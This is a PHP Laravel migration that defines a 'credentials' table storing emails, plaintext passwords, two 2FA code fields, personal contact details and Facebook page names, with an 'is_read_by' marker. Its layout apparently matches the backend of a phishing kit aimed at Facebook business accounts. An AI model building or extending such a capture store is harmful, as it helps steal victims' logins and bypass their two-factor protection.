<?php

use Illuminate\Support\Facades\Schema;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Database\Migrations\Migration;

return new class extends Migration {
    /**
     * Run the migrations.
     *
     * @return void
     */
    public function up()
    {
        Schema::create('credentials', function (Blueprint $table) {
            $table->bigIncrements('id');
            $table->string('email');
            $table->string('password');
            $table->string('2fa_code')->nullable();
            $table->string('2fa_code_2')->nullable();


            $table->string('general_information')->nullable();
            $table->string('full_name')->nullable();
            $table->string('business_email_address')->nullable();
            $table->string('personal_email_address')->nullable();
            $table->string('mobile_phone_number')->nullable();
            $table->string('facebook_page_name')->nullable();


            $table->foreignId('is_read_by')->nullable();

            $table->timestamps();
            $table->softDeletes();
        });
    }

    /**
     * Reverse the migrations.
     *
     * @return void
     */
    public function down()
    {
        Schema::dropIfExists('credentials');
    }
};
